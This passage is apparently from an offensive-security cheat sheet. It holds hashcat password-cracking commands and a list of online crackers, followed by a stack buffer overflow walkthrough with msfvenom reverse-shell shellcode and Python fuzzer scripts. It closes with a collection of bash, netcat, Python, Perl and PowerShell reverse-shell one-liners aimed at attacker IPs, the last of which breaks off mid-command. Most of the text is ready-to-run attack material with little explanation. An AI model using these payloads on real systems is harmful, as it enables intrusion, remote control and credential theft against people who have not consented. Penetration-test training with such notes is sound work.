<span class="nx">hashcat</span><span class="w"> </span><span class="o">-</span><span class="nx">m</span><span class="w"> </span><span class="mi">1800</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">hash</span><span class="err">$&#39;</span><span class="w"> </span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">kali</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="c1">// sha512crypt</span>
<span class="nx">hashcat</span><span class="w"> </span><span class="o">-</span><span class="nx">m</span><span class="w"> </span><span class="mi">1600</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">hash</span><span class="err">$&#39;</span><span class="w"> </span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">kali</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="c1">// MD5(APR)</span>
<span class="nx">hashcat</span><span class="w"> </span><span class="o">-</span><span class="nx">m</span><span class="w"> </span><span class="mi">1500</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">hash</span><span class="err">$&#39;</span><span class="w"> </span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">kali</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="c1">// DES(Unix), Traditional DES, DEScrypt</span>
<span class="nx">hascat</span><span class="w">  </span><span class="o">-</span><span class="nx">m</span><span class="w"> </span><span class="mi">1000</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">hash</span><span class="err">$&#39;</span><span class="w"> </span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">kali</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="c1">// NTLM</span>
<span class="nx">hashcat</span><span class="w"> </span><span class="o">-</span><span class="nx">m</span><span class="w"> </span><span class="mi">500</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">hash</span><span class="err">$&#39;</span><span class="w"> </span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">kali</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="c1">// MD5crypt, MD5 (Unix)</span>
<span class="nx">hashcat</span><span class="w"> </span><span class="o">-</span><span class="nx">m</span><span class="w"> </span><span class="mi">400</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">hash</span><span class="err">$&#39;</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">kali</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span><span class="w"> </span><span class="c1">// Wordpress</span>
</code></pre></div>

<p>Online crackers</p>
<div class="highlight"><pre><span></span><code>https://hashkiller.co.uk/Cracker
https://www.cmd5.org/
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/
</code></pre></div>

<h1><strong>Vulnerability analysis</strong></h1>
<h2>BOF</h2>
<div class="highlight"><pre><span></span><code><span class="c1"># BASIC GUIDE</span>
<span class="mf">1.</span><span class="w"> </span><span class="n">Send</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">1024</span>
<span class="mf">2.</span><span class="w"> </span><span class="n">Replace</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">pattern_create</span><span class="o">.</span><span class="n">rb</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">LENGTH</span>
<span class="mf">3.</span><span class="w"> </span><span class="n">When</span><span class="w"> </span><span class="n">crash</span><span class="w"> </span><span class="s2">&quot;!mona findmsp&quot;</span><span class="w"> </span><span class="p">(</span><span class="n">E10</span><span class="o">.</span><span class="mf">11.1</span><span class="o">.</span><span class="mi">111</span><span class="w"> </span><span class="n">offset</span><span class="p">)</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">exploit</span><span class="o">/</span><span class="n">pattern_offset</span><span class="o">.</span><span class="n">rb</span><span class="w"> </span><span class="o">-</span><span class="n">q</span><span class="w"> </span><span class="n">TEXT</span><span class="s2">&quot; or &quot;</span><span class="o">!</span><span class="n">mona</span><span class="w"> </span><span class="n">pattern_offset</span><span class="w"> </span><span class="n">eip</span><span class="s2">&quot;</span>
<span class="mf">4.</span><span class="w"> </span><span class="n">Confirm</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">location</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="s2">&quot;B&quot;</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="s2">&quot;C&quot;</span>
<span class="mf">5.</span><span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">badchars</span><span class="w"> </span><span class="n">instead</span><span class="w"> </span><span class="n">CCCC</span><span class="w"> </span><span class="p">(</span><span class="n">ESP</span><span class="p">):</span>
<span class="n">badchars</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="n">with</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">_badchars</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="ow">and</span>
<span class="s2">&quot;!mona compare -a esp -f C:\Users\IEUser\Desktop</span><span class="se">\b</span><span class="s2">adchar_test.bin&quot;</span>
<span class="w">    </span><span class="mf">5.1</span><span class="w"> </span><span class="n">AWESOME</span><span class="w"> </span><span class="n">WAY</span><span class="w"> </span><span class="n">TO</span><span class="w"> </span><span class="n">CHECK</span><span class="w"> </span><span class="n">BADCHARS</span><span class="w"> </span><span class="p">(</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">bulbsecurity</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">finding</span><span class="o">-</span><span class="n">bad</span><span class="o">-</span><span class="n">characters</span><span class="o">-</span><span class="n">with</span><span class="o">-</span><span class="n">immunity</span><span class="o">-</span><span class="n">debugger</span><span class="o">-</span><span class="ow">and</span><span class="o">-</span><span class="n">mona</span><span class="o">-</span><span class="n">py</span><span class="o">/</span><span class="p">):</span>
<span class="w">        </span><span class="n">a</span><span class="o">.</span><span class="w"> </span><span class="o">!</span><span class="n">mona</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">-</span><span class="n">set</span><span class="w"> </span><span class="n">workingfolder</span><span class="w"> </span><span class="n">c</span><span class="p">:</span>\<span class="n">logs</span>\<span class="o">%</span><span class="n">p</span>
<span class="w">        </span><span class="n">b</span><span class="o">.</span><span class="w"> </span><span class="o">!</span><span class="n">mona</span><span class="w"> </span><span class="n">bytearray</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x00\x0d</span><span class="s2">&quot;</span>
<span class="w">        </span><span class="n">c</span><span class="o">.</span><span class="w"> </span><span class="n">Copy</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">c</span><span class="p">:</span>\<span class="n">logs</span>\<span class="o">%</span><span class="n">p</span>\<span class="n">bytearray</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="n">exploit</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">again</span>
<span class="w">        </span><span class="n">d</span><span class="o">.</span><span class="w"> </span><span class="o">!</span><span class="n">mona</span><span class="w"> </span><span class="n">compare</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">logs</span>\<span class="o">%</span><span class="n">p</span>\<span class="n">bytearray</span><span class="o">.</span><span class="n">bin</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="mi">02</span><span class="n">F238D0</span><span class="w"> </span><span class="p">(</span><span class="n">ESP</span><span class="w"> </span><span class="n">address</span><span class="p">)</span>
<span class="w">        </span><span class="n">e</span><span class="o">.</span><span class="w"> </span><span class="n">In</span><span class="w"> </span><span class="s2">&quot; data&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">before</span><span class="w"> </span><span class="n">unicode</span><span class="w"> </span><span class="n">chars</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">shows</span><span class="w"> </span><span class="n">badchars</span><span class="o">.</span>
<span class="w"> </span><span class="mf">6.</span><span class="w"> </span><span class="n">Find</span><span class="w"> </span><span class="n">JMP</span><span class="w"> </span><span class="n">ESP</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="s2">&quot;!mona modules&quot;</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="s2">&quot;!mona jmp -r esp&quot;</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="s2">&quot;!mona jmp -r esp -cpb &#39;</span><span class="se">\x00\x0a\x0d</span><span class="s2">&#39;&quot;</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">security</span><span class="w"> </span><span class="n">modules</span><span class="w"> </span><span class="s2">&quot;FALSE&quot;</span>

<span class="w">    </span><span class="mf">6.1</span><span class="w"> </span><span class="n">Then</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;!mona find -s &quot;</span>\<span class="n">xff</span>\<span class="n">xe4</span><span class="s2">&quot; -m PROGRAM/DLL-FALSE&quot;</span>
<span class="w">    </span><span class="mf">6.2</span><span class="w"> </span><span class="n">Remember</span><span class="w"> </span><span class="n">put</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">JMP</span><span class="w"> </span><span class="n">ESP</span><span class="w"> </span><span class="n">location</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">reverse</span><span class="w"> </span><span class="n">order</span><span class="w"> </span><span class="n">due</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">endianness</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="n">F4A358F</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span>\<span class="n">x8f</span>\<span class="n">x35</span>\<span class="n">x4a</span>\<span class="n">x5f</span>


<span class="mf">7.</span><span class="w"> </span><span class="n">Generate</span><span class="w"> </span><span class="n">shellcode</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">place</span><span class="w"> </span><span class="n">it</span><span class="p">:</span>
<span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">shell_reverse_tcp</span><span class="w"> </span><span class="n">LHOST</span><span class="o">=</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=</span><span class="mi">4433</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="err">–</span><span class="n">e</span><span class="w"> </span><span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>

<span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">shell_reverse_tcp</span><span class="w"> </span><span class="n">lhost</span><span class="o">=</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="n">lport</span><span class="o">=</span><span class="mi">443</span><span class="w"> </span><span class="n">EXITFUNC</span><span class="o">=</span><span class="n">thread</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="n">x86</span><span class="w"> </span><span class="o">--</span><span class="n">platform</span><span class="w"> </span><span class="n">windows</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x00\x0a\x0d</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="n">shellcode</span>

<span class="mf">8.</span><span class="w"> </span><span class="n">Final</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="n">like</span><span class="p">:</span>
<span class="n">buffer</span><span class="o">=</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">2606</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x8f\x35\x4a\x5f</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">shellcode</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="c1">################ sample 1 ################################################</span>
<span class="c1">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;usage: python fuzzer.py 10.11.1.111 PORT&quot;</span><span class="p">)</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">1000</span>

<span class="n">ipAddress</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ipAddress</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
    <span class="nb">print</span> <span class="s2">&quot;Sending payload&quot;</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="nb">print</span> <span class="s2">&quot;Done&quot;</span>
    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;Error&quot;</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1">################ sample 2 ################################################</span>
<span class="c1">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">socket</span> <span class="k">as</span> <span class="nn">so</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">port</span> <span class="o">=</span> <span class="mi">5555</span>
<span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s2">&quot;[+] Usage </span><span class="si">%s</span><span class="s2"> host&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>

<span class="n">req1</span> <span class="o">=</span> <span class="s2">&quot;AUTH &quot;</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span><span class="o">*</span><span class="mi">1072</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">so</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">so</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">so</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="k">try</span><span class="p">:</span>
     <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">server</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
     <span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
     <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">req1</span><span class="p">)</span>
     <span class="nb">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
<span class="k">except</span><span class="p">:</span>
     <span class="nb">print</span> <span class="s2">&quot;[!] connection refused, check debugger&quot;</span>
<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div>

<h2>Find xploits - Searchsploit and google</h2>
<p>Where there are many exploits for a software, use google. It will automatically sort it by popularity.</p>
<div class="highlight"><pre><span></span><code>site:exploit-db.com<span class="w"> </span>apache<span class="w"> </span><span class="m">2</span>.4.7

<span class="c1"># Remove dos-exploits</span>

searchsploit<span class="w"> </span>Apache<span class="w"> </span><span class="m">2</span>.4.7<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;/dos/&#39;</span>
searchsploit<span class="w"> </span>Apache<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;/dos/&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-vi<span class="w"> </span><span class="s2">&quot;tomcat&quot;</span>

<span class="c1"># Only search the title (exclude the path), add the -t</span>
searchsploit<span class="w"> </span>-t<span class="w"> </span>Apache<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;/dos/&#39;</span>
</code></pre></div>

<h2>Reverse Shells</h2>
<p>https://www.revshells.com/</p>
<p><strong><em>escape quotes if running from command line</em></strong> (ex., ((\"192.168.49.232\",80)))</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Linux</span>
bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/10.11.1.111/4443<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">10</span>.11.1.111<span class="w"> </span><span class="m">4443</span><span class="w"> </span>&gt;/tmp/f
nc<span class="w"> </span>-e<span class="w"> </span>/bin/sh<span class="w"> </span><span class="m">10</span>.11.1.111<span class="w"> </span><span class="m">4443</span>

<span class="c1"># Python</span>
python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.11.1.111&quot;,4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>

__import__<span class="o">(</span><span class="s1">&#39;os&#39;</span><span class="o">)</span>.system<span class="o">(</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.9 4433 &gt;/tmp/f&#39;</span><span class="o">)</span>-1<span class="se">\</span>

<span class="c1"># Perl</span>
perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;use Socket;$i=&quot;10.11.1.111&quot;;$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>

<span class="c1"># Windows</span>
nc<span class="w"> </span>-e<span class="w"> </span>cmd.exe<span class="w"> </span><span class="m">10</span>.11.1.111<span class="w"> </span><span class="m">4443</span>
powershell<span class="w"> </span>-nop<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.11&#39;,4444);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()&quot;</span>

<span class="c1"># The below drops into a cmd.exe shell [ $ps -&gt; into PowerShell / $ps=$false -&gt; to go back to cmd.exe]:</span>

powershell<span class="w"> </span>-NoP<span class="w"> </span>-NonI<span class="w"> </span>-W<span class="w"> </span>Hidden<span class="w"> </span>-Exec<span class="w"> </span>Bypass<span class="w"> </span><span class="s2">&quot;&amp; {</span><span class="nv">$ps</span><span class="s2">=</span><span class="nv">$false</span><span class="s2">;</span><span class="nv">$hostip</span><span class="s2">=&#39;192.168.49.74&#39;;</span><span class="nv">$port</span><span class="s2">=445;</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient(</span><span class="nv">$hostip</span><span class="s2">,</span><span class="nv">$port</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..50000|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$cmd</span><span class="s2">=(get-childitem Env:ComSpec).value;</span><span class="nv">$inArray</span><span class="s2">=</span><span class="nv">$data</span><span class="s2">.split();</span><span class="nv">$item</span><span class="s2">=</span><span class="nv">$inArray</span><span class="s2">[0];if((</span><span class="nv">$item</span><span class="s2"> -eq &#39;</span><span class="nv">$ps</span><span class="s2">&#39;) -and (</span><span class="nv">$ps</span><span class="s2"> -eq </span><span class="nv">$false</span><span class="s2">)){</span><span class="nv">$ps</span><span class="s2">=</span><span class="nv">$true</span><span class="s2">}if(</span><span class="nv">$item</span><span class="s2"> -like &#39;?:&#39;){</span><span class="nv">$item</span><span class="s2">=&#39;d:&#39;}</span><span class="nv">$myArray</span><span class="s2">=@(&#39;cd&#39;,&#39;exit&#39;,&#39;d:&#39;,&#39;pwd&#39; ,&#39;ls&#39;,&#39;ps&#39;,&#39;rm&#39;,&#39;cp&#39;,&#39;mv&#39;,&#39;cat&#39;);</span><span class="nv">$do</span><span class="s2">=</span><span class="nv">$false</span><span class="s2">;foreach (</span><span class="nv">$i</span><span class="s2"> in </span><span class="nv">$myArray</span><span class="s2">){if(</span><span class="nv">$item</span><span class="s2"> -eq </span><span class="nv">$i</span><span class="s2">){</span><span class="nv">$do</span><span class="s2">=</span><span class="nv">$true</span><span class="s2">}}if(</span><span class="nv">$do</span><span class="s2"> -or </span><span class="nv">$ps</span><span class="s2">){</span><span class="nv">$sendback</span><span class="s2">=( iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 |Out-String)}else{</span><span class="nv">$data2</span><span class="s2">=&#39;/c &#39;+</span><span class="nv">$data</span><span class="s2">;</span><span class="nv">$sendback</span><span class="s2"> = ( &amp;</span><span class="nv">$cmd</span><span class="s2"> </span><span class="nv">$data2</span><span class="s2"> 2&gt;&amp;1 | Out-String)};if(</span><span class="nv">$ps</span><span class="s2">){</span><span 